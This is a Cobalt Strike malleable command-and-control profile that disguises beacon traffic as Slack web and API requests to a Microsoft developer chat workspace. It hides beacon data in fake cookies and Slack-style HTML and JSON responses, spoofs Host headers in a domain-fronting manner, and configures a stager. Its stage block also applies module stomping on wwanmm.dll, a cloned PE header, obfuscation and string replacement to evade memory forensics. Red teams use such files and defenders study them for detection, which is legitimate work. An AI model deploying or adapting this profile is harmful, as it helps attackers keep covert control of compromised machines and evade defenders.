#slack profile
#used a MS dev group from a 'top slack groups' list
#setting the host header can mess things up if a LB, etc get involved. i.e. like domain fronting action. Comment/change Host: header if having issues!
#I tested module stomp on Win10 x64 enterprise with several payload options.
#xx0hcd


set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)";
set dns_idle "8.8.8.8";
set maxdns    "235";


http-get {

    set uri "/messages/C0527B0NM";
    
    client {

	header "Host" "msdevchat.slack.com";
	header "Accept" "*/*";
	header "Accept-Language" "en-US";
	header "Connection" "close";
	
        
        metadata {
            base64url;
            
	    append ";_ga=GA1.2.875";
	    append ";__ar_v4=%8867UMDGS643";
	    prepend "d=";
#	    prepend "cvo_sid1=R456BNMD64;";
	    prepend "_ga=GA1.2.875;";
	    prepend "b=.12vPkW22o;";
	    header "Cookie";

        }

    }

    server {

	header "Content-Type" "text/html; charset=utf-8";
	header "Connection" "close";
	header "Server" "Apache";
	header "X-XSS-Protection" "0";
	header "Strict-Transport-Security" "max-age=31536000; includeSubDomains; preload";
	header "Referrer-Policy" "no-referrer";
	header "X-Slack-Backend" "h";
	header "Pragma" "no-cache";
	header "Cache-Control" "private, no-cache, no-store, must-revalidate";
	header "X-Frame-Options" "SAMEORIGIN";
	header "Vary" "Accept-Encoding";
	header "X-Via" "haproxy-www-w6k7";
        

        output {

            base64url;

	    prepend "<!DOCTYPE html>
<html lang=\"en-US\" class=\"supports_custom_scrollbar\">

	<head>

<meta charset=\"utf-8\">
<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\">
<meta name=\"referrer\" content=\"no-referrer\">
<meta name=\"superfish\" content=\"nofish\">
        <title>Microsoft Developer Chat Slack</title>
    <meta name=\"author\" content=\"Slack\">
        

	<link rel=\"dns-prefetch\" href=\"https://a.slack-edge.com?id=";

	    append "\"> </script>";
	    
	    append "<div id=\"client-ui\" class=\"container-fluid sidebar_theme_\"\"\">

	
<div id=\"banner\" class=\"hidden\" role=\"complementary\" aria-labelledby=\"notifications_banner_aria_label\">
	<h1 id=\"notifications_banner_aria_label\" class=\"offscreen\">Notifications Banner</h1>

	<div id=\"notifications_banner\" class=\"banner sk_fill_blue_bg hidden\">
		Slack needs your permission to <button type=\"button\" class=\"btn_link\">enable desktop notifications</button>.		<button type=\"button\" class=\"btn_unstyle banner_dismiss ts_icon ts_icon_times_circle\" data-action=\"dismiss_banner\" aria-label=\"Dismiss\"></button>
	</div>

	<div id=\"notifications_dismiss_banner\" class=\"banner seafoam_green_bg hidden\">
		We strongly recommend enabling desktop notifications if you’ll be using Slack on this computer.		<span class=\"inline_block no_wrap\">
			<button type=\"button\" class=\"btn_link\" onclick=\"TS.ui.banner.close(); TS.ui.banner.growlsPermissionPrompt();\">Enable notifications</button> •
			<button type=\"button\" class=\"btn_link\" onclick=\"TS.ui.banner.close()\">Ask me next time</button> •
			<button type=\"button\" class=\"btn_link\" onclick=\"TS.ui.banner.closeNagAndSetCookie()\">Never ask again on this computer</button>
		</span>
	</div>";

            print;
        }
    }
}

http-post {
    
    set uri "/api/api.test";

    client {

	header "Host" "msdevchat.slack.com";
	header "Accept" "*/*";
	header "Accept-Language" "en-US";     
        
        output {
            base64url;
	    
	    append ";_ga=GA1.2.875";
	    append "__ar_v4=%8867UMDGS643";
	    prepend "d=";
#	    prepend "cvo_sid1=R456BNMD64;";
	    prepend "_ga=GA1.2.875;";
	    prepend "b=.12vPkW22o;";
	    header "Cookie";


        }


        id {
#not sure on this, just trying to blend it in.
            base64url;
	    prepend "GA1.";
	    header "_ga";

        }
    }

    server {

	header "Content-Type" "application/json; charset=utf-8";
	header "Connection" "close";
	header "Server" "Apache";
	header "Strict-Transport-Security" "max-age=31536000; includeSubDomains; preload";
	header "Referrer-Policy" "no-referrer";
	header "X-Content-Type-Options" "nosniff";
	header "X-Slack-Req-Id" "6319165c-f976-4d0666532";
	header "X-XSS-Protection" "0";
	header "X-Slack-Backend" "h";
	header "Vary" "Accept-Encoding";
	header "Access-Control-Allow-Origin" "*";
	header "X-Via" "haproxy-www-6g1x";
        

        output {
            base64;

	    prepend "{\"ok\":true,\"args\":{\"user_id\":\"LUMK4GB8C\",\"team_id\":\"T0527B0J3\",\"version_ts\":\"";
	    append "\"},\"warning\":\"superfluous_charset\",\"response_metadata\":{\"warnings\":[\"superfluous_charset\"]}}";

            print;
        }
    }
}

http-stager {

    set uri_x86 "/messages/DALBNSf25";
    set uri_x64 "/messages/DALBNSF25";

    client {
	header "Accept" "*/*";
	header "Accept-Language" "en-US,en;q=0.5";
	header "Accept-Encoding" "gzip, deflate";
	header "Connection" "close";
    }

    server {
	header "Content-Type" "text/html; charset=utf-8";        
        header "Connection" "close";
	header "Server" "Apache";
	header "X-XSS-Protection" "0";
	header "Strict-Transport-Security" "max-age=31536000; includeSubDomains; preload";
	header "Referrer-Policy" "no-referrer";
	header "X-Slack-Backend" "h";
	header "Pragma" "no-cache";
	header "Cache-Control" "private, no-cache, no-store, must-revalidate";
	header "X-Frame-Options" "SAMEORIGIN";
	header "Vary" "Accept-Encoding";
	header "X-Via" "haproxy-www-suhx";
    
    }


}

###new 3.11 stage options###

#If you havent watched the videos/tested then probably comment out the 'set_module_xx' part.
#https://blog.cobaltstrike.com/2018/04/09/cobalt-strike-3-11-the-snake-that-eats-its-tail/
#https://blog.cobaltstrike.com/2018/04/23/fighting-the-toolset/



#used peclone on wwanmm.dll. 
#don't use 'set image_size_xx' if using 'set module_xx'
stage {
	set checksum       "0";
	set compile_time   "25 Oct 2016 01:57:23";
	set entry_point    "170000";
#	set image_size_x86 "6586368";
#	set image_size_x64 "6586368";
	set name	   "WWanMM.dll";
	set userwx 	   "false";
	set cleanup	   "true";
	set stomppe	   "true";
	set obfuscate	   "true";
	set rich_header    "\xee\x50\x19\xcf\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xa3\x49\xe4\x9c\x84\x31\x77\x9c\x1e\xad\x86\x9c\xae\x31\x77\x9c\x1e\xad\x85\x9c\xa7\x31\x77\x9c\xaa\x31\x76\x9c\x08\x31\x77\x9c\x1e\xad\x98\x9c\xa3\x31\x77\x9c\x1e\xad\x84\x9c\x98\x31\x77\x9c\x1e\xad\x99\x9c\xab\x31\x77\x9c\x1e\xad\x80\x9c\x6d\x31\x77\x9c\x1e\xad\x9a\x9c\xab\x31\x77\x9c\x1e\xad\x87\x9c\xab\x31\x77\x9c\x52\x69\x63\x68\xaa\x31\x77\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";


#module stomp

#don't use 'set image_size_xx' if using 'set module_xx'
	set module_x86 "wwanmm.dll";
	set module_x64 "wwanmm.dll";

#replace 'tell' strings that can show up in memory analysis, just putting a couple in here..
	transform-x86 {
	    strrep "ReflectiveLoader" "";
	    strrep "beacon.dll" "winsku.dll";
	}

	transform-x64 {
	    strrep "ReflectiveLoader" "";
	    strrep "beacon.64.dll" "winsockhc.dll";
	}
}
